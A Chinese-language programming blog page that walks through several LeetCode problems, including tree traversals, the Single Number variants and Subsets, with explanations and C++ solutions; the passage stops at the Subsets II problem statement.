<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">class Solution &#123;</div><div class="line">public:</div><div class="line">    int maxArea(vector&lt;int&gt;&amp; height) &#123;</div><div class="line">        int area = 0;</div><div class="line">        int length = height.size();</div><div class="line">        int l=0,r=length-1;</div><div class="line">        int left = height[0],right = height[length-1];</div><div class="line">        while(l&lt;r)&#123;</div><div class="line">            int tmp=0;</div><div class="line">            if(left&lt;right)&#123;</div><div class="line">               tmp = left*(r-l);</div><div class="line">                while(height[l]&lt;=left)&#123;</div><div class="line">                    l++;</div><div class="line">                &#125;</div><div class="line">                left = height[l];</div><div class="line">            &#125;else&#123;</div><div class="line">                tmp = right*(r-l);</div><div class="line">                while(height[r]&lt;=right)&#123;</div><div class="line">                    r--;</div><div class="line">                &#125;</div><div class="line">                right = height[r];</div><div class="line">            &#125;</div><div class="line">            if(area&lt;tmp)&#123;</div><div class="line">                area = tmp;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        return area;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h3 id="LeetCode-144-Binary-Tree-Preorder-Traversal"><a href="#LeetCode-144-Binary-Tree-Preorder-Traversal" class="headerlink" title="LeetCode 144 Binary Tree Preorder Traversal "></a><a href="https://leetcode-cn.com/problems/binary-tree-preorder-traversal/description/" target="_blank" rel="external">LeetCode 144 Binary Tree Preorder Traversal </a></h3><p>题目大意：给定一个二叉树，返回它的 前序 遍历。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">示例:</div><div class="line"></div><div class="line">输入: [1,null,2,3]  </div><div class="line">   1</div><div class="line">    \</div><div class="line">     2</div><div class="line">    /</div><div class="line">   3 </div><div class="line"></div><div class="line">输出: [1,2,3]</div><div class="line"></div><div class="line">进阶: 递归算法很简单，你可以通过迭代算法完成吗？</div></pre></td></tr></table></figure></p>
<p>思路：题目要求对二叉树进行非递归的前序遍历，所谓前序遍历即，先访问根节点、再访问左子树、然后是右子树。通常采用递归的方法，题目要求采用非递归的方法实现。算法如下：</p>
<ol>
<li>如果根节点非空，将根节点加入到栈中。</li>
<li>如果栈不空，弹出出栈顶节点，将其值加加入到数组中。<br> 2.1. 如果该节点的右子树不为空，将右子节点加入栈中。<br> 2.2. 如果左子节点不为空，将左子节点加入栈中。</li>
<li>重复第二步，直到栈空。 </li>
</ol>
<p>这里最重要的一个是先添加右节点，然后在添加左节点，这样做是为了使左节点在栈顶，下一次迭代的时候处理的是左节点。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">/**</div><div class="line"> * Definition for a binary tree node.</div><div class="line"> * struct TreeNode &#123;</div><div class="line"> *     int val;</div><div class="line"> *     TreeNode *left;</div><div class="line"> *     TreeNode *right;</div><div class="line"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</div><div class="line"> * &#125;;</div><div class="line"> */</div><div class="line">class Solution &#123;</div><div class="line">public:</div><div class="line">    vector&lt;int&gt; preorderTraversal(TreeNode* root) &#123;</div><div class="line">        stack&lt;TreeNode *&gt; sta;</div><div class="line">        </div><div class="line">        if(root!=NULL)</div><div class="line">          sta.push(root);</div><div class="line">        </div><div class="line">        vector&lt;int&gt; result;</div><div class="line">        while(!sta.empty())&#123;</div><div class="line">            TreeNode * node = sta.top();</div><div class="line">            sta.pop();</div><div class="line">            result.push_back(node-&gt;val);</div><div class="line">            if(node-&gt;right!=NULL)&#123;</div><div class="line">                sta.push(node-&gt;right);</div><div class="line">            &#125;</div><div class="line">            if(node-&gt;left!=NULL)&#123;</div><div class="line">                sta.push(node-&gt;left);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        return result;</div><div class="line">    &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h3 id="LeetCode-94-Binary-Tree-Inorder-Traversal-中序遍历"><a href="#LeetCode-94-Binary-Tree-Inorder-Traversal-中序遍历" class="headerlink" title="LeetCode 94 Binary Tree Inorder Traversal  中序遍历"></a><a href="https://leetcode-cn.com/problems/binary-tree-inorder-traversal/description/" target="_blank" rel="external">LeetCode 94 Binary Tree Inorder Traversal  中序遍历</a></h3><p>题目大意：给定一个二叉树，返回它的中序 遍历。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">示例:</div><div class="line"></div><div class="line">输入: [1,null,2,3]</div><div class="line">   1</div><div class="line">    \</div><div class="line">     2</div><div class="line">    /</div><div class="line">   3</div><div class="line"></div><div class="line">输出: [1,3,2]</div><div class="line"></div><div class="line">进阶: 递归算法很简单，你可以通过迭代算法完成吗？</div></pre></td></tr></table></figure>
<p>思路：<br>太经典基础的算法问题了，但想写出一个无bug的非递归二叉树中序遍历也不是很容易。先看递归版本的代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">class Solution &#123;</div><div class="line">private:</div><div class="line">    vector&lt;int&gt; result;</div><div class="line">    void helper(TreeNode* root) &#123;</div><div class="line">        if (root == nullptr) &#123;</div><div class="line">            return;</div><div class="line">        &#125;</div><div class="line">        helper(root -&gt; left);</div><div class="line">        result.push_back(root -&gt; val);</div><div class="line">        helper(root -&gt; right);</div><div class="line">    &#125;</div><div class="line">public:</div><div class="line">    vector&lt;int&gt; inorderTraversal(TreeNode* root) &#123;</div><div class="line">        helper(root);</div><div class="line">        return result;</div><div class="line">    &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>再考虑非递归，其实就是对于每个节点，走到最左端，沿路径压栈。</p>
<p>到达最左端后以此返回，开始弹栈，对于每个弹出的元素，记录其value，并且走向其右节点重复上述过程（走到最左端…）。</p>
<p>直到栈内元素为空为止。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">class Solution &#123;</div><div class="line">public:</div><div class="line">    vector&lt;int&gt; inorderTraversal(TreeNode* root) &#123;</div><div class="line">        vector&lt;int&gt; result;</div><div class="line">        stack&lt;TreeNode*&gt; s;</div><div class="line">        TreeNode* p = root;</div><div class="line">        while (p || !s.empty()) &#123;</div><div class="line">            while (p != nullptr) &#123;</div><div class="line">                s.push(p);</div><div class="line">                p = p -&gt; left; </div><div class="line">            &#125;</div><div class="line">            if (!s.empty()) &#123;</div><div class="line">                p = s.top();</div><div class="line">                result.push_back(p -&gt; val);</div><div class="line">                s.pop();</div><div class="line">                p = p -&gt; right;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        return result;</div><div class="line">    &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<h3 id="LeetCode-145-Binary-Tree-Postorder-Traversal"><a href="#LeetCode-145-Binary-Tree-Postorder-Traversal" class="headerlink" title="LeetCode 145 Binary Tree Postorder Traversal"></a><a href="https://leetcode-cn.com/problems/binary-tree-postorder-traversal/description/" target="_blank" rel="external">LeetCode 145 Binary Tree Postorder Traversal</a></h3><p>题目大意：给定一个二叉树，返回它的 后序 遍历。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">示例:</div><div class="line"></div><div class="line">输入: [1,null,2,3]  </div><div class="line">   1</div><div class="line">    \</div><div class="line">     2</div><div class="line">    /</div><div class="line">   3 </div><div class="line"></div><div class="line">输出: [3,2,1]</div><div class="line"></div><div class="line">进阶: 递归算法很简单，你可以通过迭代算法完成吗？</div></pre></td></tr></table></figure></p>
<p>思路：利用到了一个后续遍历的特点，即：</p>
<blockquote>
<p>后续遍历序列中，父节点前面一定紧挨着他的儿子节点（如果有的话）</p>
</blockquote>
<p>所以，额外保存一个pre变量代表前一个遍历的节点，用来判断当前的节点（如果是父节点）的子节点的访问情况，。如果pre节点是当前节点的儿子节点（或者当前节点没有儿子），说明当前节点的儿子节点都遍历过了，可以遍历父节点了。</p>
<p>如何更新维护pre呢？当一个节点输出后，将prev置为这个节点，这是因为如果pre是后续遍历序列中的前一个节点，那么这个pre节点必须是已经被输出的节点。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">/**</div><div class="line"> * Definition for a binary tree node.</div><div class="line"> * struct TreeNode &#123;</div><div class="line"> *     int val;</div><div class="line"> *     TreeNode *left;</div><div class="line"> *     TreeNode *right;</div><div class="line"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</div><div class="line"> * &#125;;</div><div class="line"> */</div><div class="line">class Solution &#123;</div><div class="line">public:</div><div class="line">    vector&lt;int&gt; postorderTraversal(TreeNode* root) &#123;</div><div class="line">        vector&lt;int&gt; result;</div><div class="line">        stack&lt;TreeNode*&gt; s;</div><div class="line">        TreeNode* pre = NULL;</div><div class="line">        TreeNode* node = root;</div><div class="line">        if(node)&#123;</div><div class="line">            s.push(node);</div><div class="line">        &#125;</div><div class="line">        while (!s.empty()) &#123;</div><div class="line">            node = s.top();</div><div class="line">            if(!node)&#123;</div><div class="line">                s.pop();</div><div class="line">            &#125;else if((node-&gt;left==NULL &amp;&amp; node-&gt;right==NULL) || (node-&gt;left == pre &amp;&amp; pre) || (node-&gt;right == pre &amp;&amp; pre))&#123;</div><div class="line">                result.push_back(node-&gt;val);</div><div class="line">                s.pop();</div><div class="line">                pre = node;</div><div class="line">            &#125;else&#123;</div><div class="line">                s.push(node-&gt;right);</div><div class="line">                s.push(node-&gt;left);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        return result;</div><div class="line">    &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h3 id="LeetCode-136-Single-NumberSingle-Number"><a href="#LeetCode-136-Single-NumberSingle-Number" class="headerlink" title="LeetCode 136 Single NumberSingle Number"></a><a href="https://leetcode-cn.com/problems/single-number/description/" target="_blank" rel="external">LeetCode 136 Single NumberSingle Number</a></h3><p>题目大意:给定一个非空整数数组，除了某个元素只出现一次以外，其余每个元素均出现两次。找出那个只出现了一次的元素。</p>
<p>说明：你的算法应该具有线性时间复杂度。 你可以不使用额外空间来实现吗？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">示例 1:</div><div class="line"></div><div class="line">输入: [2,2,1]</div><div class="line">输出: 1</div><div class="line"></div><div class="line">示例 2:</div><div class="line"></div><div class="line">输入: [4,1,2,1,2]</div><div class="line">输出: 4</div></pre></td></tr></table></figure>
<p>思路：题目要求O(n)时间复杂度，O(1)空间复杂度，所以简单地暴力搜索是肯定不行的了，需要用巧妙的方法–利用异或操作。异或的性质1：交换律a ^ b = b ^ a，性质2：0 ^ a = a。于是利用交换律可以将数组假想成相同元素全部相邻，于是将所有元素依次做异或操作，相同元素异或为0，最终剩下的元素就为Single Number。时间复杂度O(n)，空间复杂度O(1)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">class Solution &#123;</div><div class="line">public:</div><div class="line">    int singleNumber(vector&lt;int&gt;&amp; nums) &#123;</div><div class="line">         //异或</div><div class="line">        int elem = 0;</div><div class="line">        for(int i = 0; i &lt; nums.size() ; i++) &#123;</div><div class="line">            elem = elem ^ nums[i];</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">        return elem;</div><div class="line">    &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h3 id="LeetCode-137：Single-Number-II"><a href="#LeetCode-137：Single-Number-II" class="headerlink" title="LeetCode 137：Single Number II"></a><a href="https://leetcode-cn.com/problems/single-number-ii/description/" target="_blank" rel="external">LeetCode 137：Single Number II</a></h3><p>题目大意：给定一个非空整数数组，除了某个元素只出现一次以外，其余每个元素均出现了三次。找出那个只出现了一次的元素。</p>
<p>说明：你的算法应该具有线性时间复杂度。 你可以不使用额外空间来实现吗？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">示例 1:</div><div class="line"></div><div class="line">输入: [2,2,3,2]</div><div class="line">输出: 3</div><div class="line"></div><div class="line">示例 2:</div><div class="line"></div><div class="line">输入: [0,1,0,1,0,1,99]</div><div class="line">输出: 99</div></pre></td></tr></table></figure>
<p>思路：Single Number II 比Single Number要复杂的多，很难直观的找到算法。</p>
<p>考虑每个元素的为一个32位的二进制数，这样每一位上出现要么为1 ，要么为0。对数组，统计每一位上1 出现的次数count，必定是3N或者3N+1 次。让count对3取模，能够获得到那个只出现1次的元素该位是0还是1。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">class Solution &#123;</div><div class="line">public:</div><div class="line">    int singleNumber(vector&lt;int&gt;&amp; nums) &#123;</div><div class="line">        int length = nums.size();  </div><div class="line">        int result = 0;  </div><div class="line">        for(int i = 0; i&lt;32; i++)&#123;  </div><div class="line">            int count = 0;   </div><div class="line">            int mask = 1&lt;&lt; i;  </div><div class="line">            for(int j=0; j&lt;length; j++)&#123;  </div><div class="line">                if(nums[j] &amp; mask)  </div><div class="line">                    count++;  </div><div class="line">            &#125;  </div><div class="line">          if(count %3)  </div><div class="line">                result |= mask;  </div><div class="line">        &#125;  </div><div class="line">        return result;  </div><div class="line">    &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>同时，不难发现，该算法同样适用于Single Number I的解答。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">class Solution &#123;  </div><div class="line">public:  </div><div class="line">    int singleNumber(vector&lt;int&gt;&amp; nums) &#123;  </div><div class="line">        int length = nums.size();  </div><div class="line">        int result = 0;  </div><div class="line">        for(int i = 0; i&lt;32; i++)&#123;  </div><div class="line">            int count = 0;  </div><div class="line">            int mask = 1&lt;&lt; i;  </div><div class="line">            for(int j=0; j&lt;length; j++)&#123;  </div><div class="line">                if(nums[j] &amp; mask)  </div><div class="line">                    count++;  </div><div class="line">            &#125;  </div><div class="line">           if(count %2)  </div><div class="line">                result |= mask;  </div><div class="line">        &#125;  </div><div class="line">        return result;  </div><div class="line">    &#125;  </div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>同时，对Single Number II 网上还有一种解法，自己不是很明白，先记录下日后研究。</p>
<pre><code>int singleNumber(int A[], int n)  
{  
    int one = 0, two = 0;  
    for (int i = 0; i &lt; n; i++)  
    {  
        two |= A[i] &amp; one;  
        one ^= A[i];  
        int three = one &amp; two;  
        one &amp;= ~three;  
        two &amp;= ~three;  
    }  
    return one;  
}  
</code></pre><h3 id="LeetCode-260-Single-Number-III"><a href="#LeetCode-260-Single-Number-III" class="headerlink" title="LeetCode 260 Single Number III"></a><a href="https://leetcode-cn.com/problems/single-number-iii/description/" target="_blank" rel="external">LeetCode 260 Single Number III</a></h3><p>题目大意：给定一个整数数组 nums，其中恰好有两个元素只出现一次，其他所有元素均出现两次。 找出只出现一次的那两个元素。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">示例:</div><div class="line"></div><div class="line">给定 nums = [1, 2, 1, 3, 2, 5], 返回 [3, 5].</div><div class="line"></div><div class="line">注意：</div><div class="line"></div><div class="line">    结果的顺序并不重要，对于上面的例子 [5, 3] 也是正确答案。</div><div class="line">    你的算法应该具有线性复杂度，你能否仅使用恒定的空间复杂度来实现它？</div></pre></td></tr></table></figure></p>
<p>这个题，想了许久没头绪，只好上网看大神的讲解。</p>
<p>整个算法的具体思路，假设数组中两个不同的数字为 A 和 B；</p>
<ol>
<li>通过遍历整个数组并求整个数组所有数字之间的 XOR，根据 XOR 的特性可以得到最终的结果为 AXORB = A XOR B；</li>
<li>通过某种特定的方式，我们可以通过 AXORB 得到在数字 A 和数字 B 的二进制下某一位不相同的位；因为A 和 B 是不相同的，所以他们的二进制数字有且至少有一位是不相同的。我们将这一位设置为 1，并将所有的其他位设置为 0，我们假设我们得到的这个数字为 bitFlag；</li>
<li>那么现在，我们很容易知道，数字 A 和 数字 B 中必然有一个数字 <strong>与</strong>上 bitFlag 为 0；因为bitFlag 标志了数字 A 和数字 B 中的某一位不同，那么在数字 A 和 B 中的这一位必然是一个为 0，另一个为 1；而我们在 bitFlag 中将其他位都设置为 0，那么该位为 0 的数字与上 bitFlag 就等于 0，而该位为 1 的数字与上 bitFlag 就等于 bitFlag</li>
<li>现在问题就简单了，我们只需要在循环一次数组，将与上 bitFlag 为 0 的数字进行 XOR 运算，与上 bitFlag 不为 0 的数组进行独立的 XOR 运算。那么最后我们得到的这两个数字就是 A 和 B。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">class Solution &#123;</div><div class="line">public:</div><div class="line">    vector&lt;int&gt; singleNumber(vector&lt;int&gt;&amp; nums) &#123;</div><div class="line">        int AxorB = 0;</div><div class="line">        for(int num : nums)&#123;</div><div class="line">        	AxorB ^=num;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        int bitFlag = (AxorB &amp; (~(AxorB-1)));</div><div class="line">        vector&lt;int&gt; res = vector&lt;int&gt;(2,0);</div><div class="line">        for(int num : nums)&#123;</div><div class="line">        	if((num &amp; bitFlag) == 0)&#123;</div><div class="line">        		res[0] ^= num;</div><div class="line">        	&#125;else&#123;</div><div class="line">        		res[1] ^=num;</div><div class="line">        	&#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        return res;</div><div class="line">    &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>整个代码的精华在这里:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">//pick one bit as flag</div><div class="line">int bitFlag = (AXORB &amp; (~ (AXORB - 1)));</div></pre></td></tr></table></figure>
<p>这一行代码的作用是：找到数字 A 和数字 B 中不相同的一位，并将该位设置为 1，其他位设置为 0；根据 XOR 的定义，我们知道，在 AXORB 中，为 1 的位即 A 和 B 不相同的位，AXORB 中为 0 的位即 A 和 B 中相同的位。所以，要找到 A 和 B 中不相同的位，只需要找到在 AXORB 中从右往左第一个为 1 的位，保留该位并将其他位置为 0 即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">//其实这一行与下面的代码等价，但是论逼格就差远了（手动斜眼）</div><div class="line">public static int f(int num)&#123;</div><div class="line">    int times = 0;</div><div class="line">    while(num &gt; 0)&#123;</div><div class="line">        if(num % 2 == 1)&#123;</div><div class="line">            break;</div><div class="line">        &#125;</div><div class="line">        times++;</div><div class="line">        num = num &gt;&gt; 1;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    return 1 &lt;&lt; times;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><a href="https://segmentfault.com/a/1190000004886431" target="_blank" rel="external">大神地址</a></p>
<h3 id="LeetCode-78-Subsets"><a href="#LeetCode-78-Subsets" class="headerlink" title="LeetCode 78 Subsets"></a><a href="https://leetcode-cn.com/problems/subsets/description/" target="_blank" rel="external">LeetCode 78 Subsets</a></h3><p>题目大意：给定一组不含重复元素的整数数组 nums，返回该数组所有可能的子集（幂集）。</p>
<p>说明：解集不能包含重复的子集。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">示例:</div><div class="line"></div><div class="line">输入: nums = [1,2,3]</div><div class="line">输出:</div><div class="line">[</div><div class="line">  [3],</div><div class="line">  [1],</div><div class="line">  [2],</div><div class="line">  [1,2,3],</div><div class="line">  [1,3],</div><div class="line">  [2,3],</div><div class="line">  [1,2],</div><div class="line">  []</div><div class="line">]</div></pre></td></tr></table></figure>
<p>思路：</p>
<ul>
<li>位操作<br>对于数组[1,2,3]，可以用一个下标0和1表示是否选择该数字，0表示未选择，1表示选中，那么每一组3个0和1的组合表示一种选择，3位共有8种选择，分别是：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">000 对应[]</div><div class="line">001 对应[3]</div><div class="line">010 对应[2]</div><div class="line">011 对应[2,3]</div><div class="line">100 …</div><div class="line">101</div><div class="line">110</div><div class="line">111</div></pre></td></tr></table></figure>
</li>
</ul>
<p>那么上面为1的位表示数组中该位被选中。<br>那么只需要遍历0到1&lt;&lt; length中的数，判断每一个数中有那几位为1，为1的那几位即会构成一个子集中的一个元素。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">class Solution &#123;</div><div class="line">public:</div><div class="line">    vector&lt;vector&lt;int&gt;&gt; subsets(vector&lt;int&gt;&amp; nums) &#123;</div><div class="line">        int length = nums.size();</div><div class="line">        vector&lt;vector&lt;int&gt;&gt; r;</div><div class="line">        for(int i=0;i&lt;(1&lt;&lt;length);i++)&#123;</div><div class="line">        	vector&lt;int&gt; tmp;</div><div class="line">        	int t = i;</div><div class="line">        	for(int j=0;j&lt;length;j++)&#123;</div><div class="line">        		if(t&amp;(1&lt;&lt;j))&#123;</div><div class="line">        			tmp.push_back(nums[j]);</div><div class="line">        		&#125;</div><div class="line">        	&#125;</div><div class="line">        	r.push_back(tmp);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        return r;</div><div class="line">    &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>这中解法运用了一个转换的思想，同时巧妙地运用位运算，比如计算有三个元素时二进制111的值与判断二进制的某一位是否为1，都运用了位运算。</p>
<ul>
<li>回溯法</li>
</ul>
<p>还可以使用深度优先搜索来遍历数组，采用回溯法来剔除元素。使用一个变量来记录路径，每遍历到一个元素即表示找到一条路径，将其加入子集中。<br>对于数组[1,2,3]<br>从1开始递归查询2,3，对于2，继续向下搜索，搜索完后将2删除。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">class Solution &#123;</div><div class="line">public:    </div><div class="line">    //使用深度优先的回溯法</div><div class="line">     vector&lt;vector&lt;int&gt;&gt; subsets(vector&lt;int&gt;&amp; nums) &#123;</div><div class="line">         vector&lt;vector&lt;int&gt;&gt; result;</div><div class="line">         vector&lt;int&gt; path;</div><div class="line">         sort(nums.begin(),nums.end());</div><div class="line">         result.push_back(path);</div><div class="line">         dfs(nums,0,path,result);</div><div class="line">         return result;</div><div class="line">     &#125;</div><div class="line">     void dfs(vector&lt;int&gt;&amp; nums,int pos,vector&lt;int&gt; &amp; path,vector&lt;vector&lt;int&gt;&gt; &amp; result)</div><div class="line">     &#123;</div><div class="line">            if(pos==nums.size())</div><div class="line">                return;</div><div class="line"></div><div class="line">            for(int i=pos;i&lt;nums.size();i++)</div><div class="line">            &#123;</div><div class="line">                path.push_back(nums[i]);</div><div class="line">                result.push_back(path);</div><div class="line">                dfs(nums,i+1,path,result);</div><div class="line">                path.pop_back();</div><div class="line">            &#125;</div><div class="line">     &#125;</div><div class="line"></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h3 id="LeetCode-90-Subsets-II"><a href="#LeetCode-90-Subsets-II" class="headerlink" title="LeetCode 90 Subsets II"></a><a href="https://leetcode-cn.com/problems/subsets-ii/description/" target="_blank" rel="external">LeetCode 90 Subsets II</a></h3><p>题目大意：给定一个可能包含重复元素的整数数组 nums，返回该数组所有可能的子集（幂集）。</p>
<p>说明：解集不能包含重复的子集。</p>
